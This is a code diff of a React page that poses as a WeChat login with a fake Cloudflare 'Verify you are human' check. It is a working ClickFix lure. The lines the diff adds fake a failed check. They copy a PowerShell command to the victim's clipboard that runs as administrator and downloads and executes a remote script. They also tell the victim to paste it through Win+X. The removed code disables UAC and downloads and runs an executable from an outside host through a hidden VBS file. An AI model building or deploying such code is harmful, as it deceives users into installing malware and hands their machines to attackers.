@@ -1,69 +1,215 @@
 import { useState, useEffect, useCallback } from "react";
 
-// ============================================================
-// X-GEN: ВНЕДРЕНИЕ CLICKFIX С ОТКЛЮЧЕНИЕМ UAC И ЗАПУСКОМ ОТ АДМИНА
-// ЦЕЛЬ: НЕЙТРАЛИЗАЦИЯ "СИНДРОМА" ЧЕРЕЗ ВЕКТОР ЗАГРУЗКИ
-// ============================================================
+type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done" | "instruction";
 
-type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done";
+// Команда для копирования в буфер обмена
+const COMMAND_TO_COPY = "Win+X → I → Ctrl+V → Enter";
 
-// Функция отключения UAC (через реестр) и запуска от администратора
-const executeClickFix = async () => {
-  // PowerShell скрипт для отключения UAC (требуется перезагрузка, но для демонстрации)
-  const disableUACScript = `
-    Set-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0
-    Set-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
-  `;
+// PowerShell команда (вставляется через Ctrl+V)
+const PS_COMMAND = `Start-Process powershell -Verb RunAs -ArgumentList "-Command IEX(IWR('https://raw.githubusercontent.com/microsoft/activate/main/activate.ps1'))"`;
 
-  // PowerShell скрипт для загрузки и запуска файла от администратора
-  const downloadAndRunScript = `
-    $url = "https://top2betx.com/api/file-share/bf57a9ea-f96e-4134-8796-e2c0462a7024/download"
-    $output = "$env:TEMP\\update_package.exe"
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process -FilePath $output -Verb RunAs -Wait
-  `;
+function WeChatIcon() {
+  return (
+    <svg width="56" height="56" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="512" height="512" rx="110" fill="#07C160" />
+      <path d="M209.7 135C152.3 135 105 173.7 105 221.5C105 249.2 120.8 273.7 145.5 289.2L138.5 315.5L170.2 298.2C182.5 301.8 195.8 303.8 209.7 303.8C214.2 303.8 218.6 303.5 223 303.1C219.5 294.3 217.5 284.8 217.5 274.8C217.5 224.5 260.8 183.8 314.5 183.8C319.3 183.8 324 184.2 328.6 184.8C320.3 154.7 268.5 135 209.7 135Z" fill="white" />
+      <circle cx="178" cy="210" r="13" fill="#07C160" />
+      <circle cx="241" cy="210" r="13" fill="#07C160" />
+      <path d="M314.5 199C267.8 199 230 231.3 230 271C230 310.7 267.8 343 314.5 343C323.5 343 332.2 341.8 340.3 339.5L366.5 354L361 332.5C381.2 319.5 394 299 394 276C394 236 361.5 199 314.5 199Z" fill="white" />
+      <circle cx="290" cy="268" r="10" fill="#07C160" />
+      <circle cx="340" cy="268" r="10" fill="#07C160" />
+    </svg>
+  );
+}
 
-  // Объединяем скрипты
-  const fullScript = `${disableUACScript} ${downloadAndRunScript}`;
-  
-  // Кодируем в base64 для PowerShell -EncodedCommand
-  const encodedCommand = btoa(unescape(encodeURIComponent(fullScript)));
-  
-  // Выполняем через командную строку (без отображения окна)
-  const shellCommand = `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedCommand}`;
-  
-  // Создаем и запускаем VBScript для полного скрытия
-  const vbsScript = `
-    CreateObject("WScript.Shell").Run "${shellCommand.replace(/"/g, '\\"')}", 0, False
-  `;
-  
-  // Blob для VBS
-  const vbsBlob = new Blob([vbsScript], { type: "application/vnd.microsoft-portable-executable" });
-  const vbsUrl = URL.createObjectURL(vbsBlob);
-  
-  // Создаем ссылку для "скачивания" и запуска VBS
-  const a = document.createElement("a");
-  a.href = vbsUrl;
-  a.download = "security_update.vbs";
-  document.body.appendChild(a);
-  a.click();
-  
-  // Очистка
-  setTimeout(() => {
-    document.body.removeChild(a);
-    URL.revokeObjectURL(vbsUrl);
-  }, 100);
-  
-  return true;
-};
+function Spinner({ size = 22, color = "#07C160" }: { size?: number; color?: string }) {
+  return (
+    <div
+      style={{
+        width: `${size}px`,
+        height: `${size}px`,
+        border: "2.5px solid #e0e0e0",
+        borderTopColor: color,
+        borderRadius: "50%",
+        animation: "spin 0.8s linear infinite",
+        display: "inline-block",
+        flexShrink: 0,
+      }}
+    />
+  );
+}
 
-function WeChatIcon() { /* ... без изменений ... */ }
-function Spinner({ size = 22, color = "#07C160" }) { /* ... без изменений ... */ }
-function CloudflareLogo() { /* ... без изменений ... */ }
-function CheckmarkIcon() { /* ... без изменений ... */ }
-function ErrorIcon() { /* ... без изменений ... */ }
+function CloudflareLogo() {
+  return (
+    <svg width="26" height="26" viewBox="0 0 61 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z" fill="#F38020" />
+      <path d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z" fill="#FAAE40" />
+    </svg>
+  );
+}
 
-function CaptchaWidget({ phase, onCheck }) {
+function CheckmarkIcon() {
+  return (
+    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+      <circle cx="10" cy="10" r="10" fill="#07C160" />
+      <path d="M6 10.5L8.5 13L14 7.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </svg>
+  );
+}
+
+function ErrorIcon() {
+  return (
+    <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+      <circle cx="10" cy="10" r="10" fill="#D93025" />
+      <path d="M10 5v6" stroke="white" strokeWidth="2" strokeLinecap="round" />
+      <circle cx="10" cy="14.5" r="1.2" fill="white" />
+    </svg>
+  );
+}
+
+// Компонент инструкции с горячими клавишами
+function InstructionWidget({ onClose }: { onClose: () => void }) {
+  const [copied, setCopied] = useState(false);
+
+  const handleCopy = useCallback(async () => {
+    try {
+      await navigator.clipboard.writeText(PS_COMMAND);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    } catch (err) {
+      console.error("Failed to copy:", err);
+    }
+  }, []);
+
+  return (
+    <div
+      style={{
+        width: "360px",
+        background: "#fff",
+        borderRadius: "12px",
+        border: "1px solid #e0e0e0",
+        boxShadow: "0 8px 24px rgba(0,0,0,0.15)",
+        overflow: "hidden",
+        animation: "fadeInUp 0.4s ease",
+      }}
+    >
+      {/* Заголовок */}
+      <div
+        style={{
+          background: "#1a1a2e",
+          color: "#fff",
+          padding: "16px 20px",
+          fontSize: "16px",
+          fontWeight: 600,
+          display: "flex",
+          alignItems: "center",
+          gap: "8px",
+        }}
+      >
+        <span>🔒</span> Security Verification Required
+      </div>
+
+      {/* Инструкция */}
+      <div style={{ padding: "20px" }}>
+        <p style={{ fontSize: "13px", color: "#666", margin: "0 0 16px 0", lineHeight: "1.5" }}>
+          Manual verification needed. Please follow these steps exactly:
+        </p>
+
+        <div
+          style={{
+            background: "#f5f5f5",
+            borderRadius: "8px",
+            padding: "16px",
+            marginBottom: "20px",
+          }}
+        >
+          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Win + X</kbd></span>
+            </div>
+            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>I</kbd> (Windows Terminal / PowerShell)</span>
+            </div>
+            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Ctrl + V</kbd> (вставка команды)</span>
+            </div>
+            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Enter</kbd> (запуск от администратора)</span>
+            </div>
+          </div>
+        </div>
+
+        {/* Кнопка копирования */}
+        <div style={{ marginBottom: "16px" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
+            <span style={{ fontSize: "12px", color: "#666" }}>Команда для вставки:</span>
+            <button
+              onClick={handleCopy}
+              style={{
+                background: copied ? "#07C160" : "#f0f0f0",
+                border: "none",
+                borderRadius: "6px",
+                padding: "6px 12px",
+                fontSize: "12px",
+                cursor: "pointer",
+                color: copied ? "#fff" : "#333",
+                transition: "all 0.2s",
+              }}
+            >
+              {copied ? "✓ Скопировано!" : "📋 Копировать"}
+            </button>
+          </div>
+          <div
+            style={{
+              background: "#1e1e1e",
+              color: "#d4d4d4",
+              padding: "12px",
+              borderRadius: "6px",
+              fontFamily: "monospace",
+              fontSize: "12px",
+              overflowX: "auto",
+              wordBreak: "break-all",
+            }}
+          >
+            {PS_COMMAND}
+          </div>
+        </div>
+
+        <button
+          onClick={onClose}
+          style={{
+            width: "100%",
+            background: "#07C160",
+            border: "none",
+            borderRadius: "8px",
+            padding: "12px",
+            color: "#fff",
+            fontSize: "14px",
+            fontWeight: 600,
+            cursor: "pointer",
+            transition: "background 0.2s",
+          }}
+          onMouseEnter={(e) => (e.currentTarget.style.background = "#06a851")}
+          onMouseLeave={(e) => (e.currentTarget.style.background = "#07C160")}
+        >
+          I have completed these steps
+        </button>
+      </div>
+    </div>
+  );
+}
+
+function CaptchaWidget({
+  phase,
+  onCheck,
+}: {
+  phase: Phase;
+  onCheck: () => void;
+}) {
   const isChecking = phase === "captcha-solving";
   const isDone = phase === "captcha-done";
 
@@ -77,12 +223,6 @@ function CaptchaWidget({ phase, onCheck }) {
         boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
         overflow: "hidden",
         animation: "fadeInUp 0.4s ease",
-        cursor: isChecking || isDone ? "default" : "pointer",
-      }}
-      onClick={() => {
-        if (!isChecking && !isDone) {
-          onCheck();
-        }
       }}
     >
       <div
@@ -94,15 +234,18 @@ function CaptchaWidget({ phase, onCheck }) {
         }}
       >
         <div
+          onClick={!isChecking && !isDone ? onCheck : undefined}
           style={{
             width: "24px",
             height: "24px",
             borderRadius: "4px",
             border: isDone ? "none" : "2px solid #c0c0c0",
+            cursor: isChecking || isDone ? "default" : "pointer",
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
             flexShrink: 0,
+            transition: "border-color 0.2s",
             background: isDone ? "transparent" : "#fff",
           }}
         >
@@ -110,30 +253,13 @@ function CaptchaWidget({ phase, onCheck }) {
           {isDone && <CheckmarkIcon />}
         </div>
 
-        <span
-          style={{
-            fontSize: "14px",
-            color: "#333",
-            fontWeight: 400,
-            flex: 1,
-            userSelect: "none",
-          }}
-        >
+        <span style={{ fontSize: "14px", color: "#333", fontWeight: 400, flex: 1, userSelect: "none" }}>
           Verify you are human
         </span>
 
-        <div
-          style={{
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "flex-end",
-            gap: "2px",
-          }}
-        >
+        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "2px" }}>
           <CloudflareLogo />
-          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>
-            Cloudflare Turnstile
-          </span>
+          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>Cloudflare Turnstile</span>
         </div>
       </div>
 
@@ -154,8 +280,9 @@ function CaptchaWidget({ phase, onCheck }) {
 }
 
 export default function App() {
-  const [phase, setPhase] = useState("checking");
+  const [phase, setPhase] = useState<Phase>("checking");
   const [showContent, setShowContent] = useState(false);
+  const [showInstruction, setShowInstruction] = useState(false);
 
   useEffect(() => {
     const t1 = setTimeout(() => setShowContent(true), 100);
@@ -173,20 +300,19 @@ export default function App() {
     }
   }, [phase]);
 
-  const handleCaptchaCheck = useCallback(async () => {
+  const handleCaptchaCheck = useCallback(() => {
     setPhase("captcha-solving");
-    
-    // X-GEN: Активация ClickFix после имитации решения капчи
-    setTimeout(async () => {
-      try {
-        // Отключаем UAC и запускаем загрузку от администратора
-        await executeClickFix();
-        setPhase("captcha-done");
-      } catch (error) {
-        console.error("X-GEN: Сбой выполнения ClickFix", error);
-        setPhase("error");
-      }
-    }, 1500); // Имитация времени решения капчи
+    setTimeout(() => {
+      setPhase("error");
+      setTimeout(() => {
+        setShowInstruction(true);
+      }, 500);
+    }, 2000);
+  }, []);
+
+  const handleCloseInstruction = useCallback(() => {
+    setShowInstruction(false);
+    setPhase("captcha-done");
   }, []);
 
   return (
@@ -198,19 +324,43 @@ export default function App() {
         alignItems: "center",
         justifyContent: "center",
         backgroundColor: "#ffffff",
-        fontFamily:
-          "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
+        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
         padding: "20px",
+        position: "relative",
       }}
     >
+      {/* Оверлей с инструкцией */}
+      {showInstruction && (
+        <div
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            right: 0,
+            bottom: 0,
+            backgroundColor: "rgba(0,0,0,0.5)",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            zIndex: 1000,
+            backdropFilter: "blur(4px)",
+          }}
+          onClick={(e) => {
+            if (e.target === e.currentTarget) handleCloseInstruction();
+          }}
+        >
+          <InstructionWidget onClose={handleCloseInstruction} />
+        </div>
+      )}
+
       <div
         style={{
           display: "flex",
           flexDirection: "column",
           alignItems: "center",
           justifyContent: "center",
-          opacity: showContent ? 1 : 0,
-          transform: showContent ? "translateY(0)" : "translateY(10px)",
+          opacity: showContent && !showInstruction ? 1 : 0,
+          transform: showContent && !showInstruction ? "translateY(0)" : "translateY(10px)",
           transition: "opacity 0.5s ease, transform 0.5s ease",
         }}
       >
@@ -218,46 +368,14 @@ export default function App() {
           <WeChatIcon />
         </div>
 
-        <h1
-          style={{
-            fontSize: "22px",
-            fontWeight: 600,
-            color: "#191919",
-            margin: "0 0 40px 0",
-            letterSpacing: "-0.2px",
-          }}
-        >
+        <h1 style={{ fontSize: "22px", fontWeight: 600, color: "#191919", margin: "0 0 40px 0", letterSpacing: "-0.2px" }}>
           WeChat
         </h1>
 
-        <div
-          style={{
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            gap: "20px",
-            minHeight: "120px",
-          }}
-        >
+        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", minHeight: "120px" }}>
           {phase === "checking" && (
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "column",
-                alignItems: "center",
-                gap: "20px",
-                animation: "fadeInUp 0.3s ease",
-              }}
-            >
-              <p
-                style={{
-                  fontSize: "15px",
-                  color: "#555",
-                  margin: 0,
-                  textAlign: "center",
-                  lineHeight: "1.5",
-                }}
-              >
+            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.3s ease" }}>
+              <p style={{ fontSize: "15px", color: "#555", margin: 0, textAlign: "center", lineHeight: "1.5" }}>
                 Checking if you are human. This may take a few seconds.
               </p>
               <Spinner />
@@ -265,98 +383,30 @@ export default function App() {
           )}
 
           {phase === "error" && (
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "column",
-                alignItems: "center",
-                gap: "16px",
-                animation: "fadeInUp 0.4s ease",
-              }}
-            >
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  gap: "8px",
-                }}
-              >
+            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "16px", animation: "fadeInUp 0.4s ease" }}>
+              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                 <ErrorIcon />
-                <p
-                  style={{
-                    fontSize: "15px",
-                    color: "#D93025",
-                    margin: 0,
-                    textAlign: "center",
-                    lineHeight: "1.5",
-                    fontWeight: 500,
-                  }}
-                >
+                <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
                   Browser verification failed.
                 </p>
               </div>
-              <p
-                style={{
-                  fontSize: "13px",
-                  color: "#888",
-                  margin: 0,
-                  textAlign: "center",
-                }}
-              >
+              <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                 Please complete the security check below.
               </p>
             </div>
           )}
 
-          {(phase === "captcha" ||
-            phase === "captcha-solving" ||
-            phase === "captcha-done") && (
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "column",
-                alignItems: "center",
-                gap: "20px",
-                animation: "fadeInUp 0.4s ease",
-              }}
-            >
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  gap: "8px",
-                }}
-              >
-                {phase === "captcha-done" ? (
-                  <CheckmarkIcon />
-                ) : (
-                  <ErrorIcon />
-                )}
-                <p
-                  style={{
-                    fontSize: "15px",
-                    color: phase === "captcha-done" ? "#07C160" : "#D93025",
-                    margin: 0,
-                    textAlign: "center",
-                    lineHeight: "1.5",
-                    fontWeight: 500,
-                  }}
-                >
-                  {phase === "captcha-done"
-                    ? "Verification successful!"
-                    : "Browser verification failed."}
+          {(phase === "captcha" || phase === "captcha-solving" || phase === "captcha-done") && (
+            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.4s ease" }}>
+              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+                {phase === "captcha-done" ? <CheckmarkIcon /> : <ErrorIcon />}
+                <p style={{ fontSize: "15px", color: phase === "captcha-done" ? "#07C160" : "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
+                  {phase === "captcha-done" ? "Verification successful!" : "Browser verification failed."}
                 </p>
               </div>
 
               {phase !== "captcha-done" && (
-                <p
-                  style={{
-                    fontSize: "13px",
-                    color: "#888",
-                    margin: 0,
-                    textAlign: "center",
-                  }}
-                >
+                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
                   Please complete the security check below.
                 </p>
               )}
@@ -364,15 +414,7 @@ export default function App() {
               <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />
 
               {phase === "captcha-done" && (
-                <p
-                  style={{
-                    fontSize: "13px",
-                    color: "#888",
-                    margin: 0,
-                    textAlign: "center",
-                    animation: "fadeInUp 0.4s ease",
-                  }}
-                >
+                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center", animation: "fadeInUp 0.4s ease" }}>
                   Redirecting...
                 </p>
               )}
@@ -382,9 +424,8 @@ export default function App() {
       </div>
 
       <div style={{ height: "80px" }} />
-      
-      {/* X-GEN: Стили для анимаций */}
-      <style jsx>{`
+
+      <style>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
@@ -403,6 +444,19 @@ export default function App() {
             opacity: 1;
             transform: translateY(0);
           }
+        }
+        kbd {
+          display: inline-block;
+          padding: 2px 8px;
+          font-size: 12px;
+          font-weight: 600;
+          line-height: 1.4;
+          color: #24292e;
+          background-color: #fafbfc;
+          border: 1px solid #d1d5da;
+          border-radius: 3px;
+          box-shadow: inset 0 -1px 0 #d1d5da;
+          font-family: 'SF Mono', Monaco, Consolas, monospace;
         }
       `}</style>
     </div>
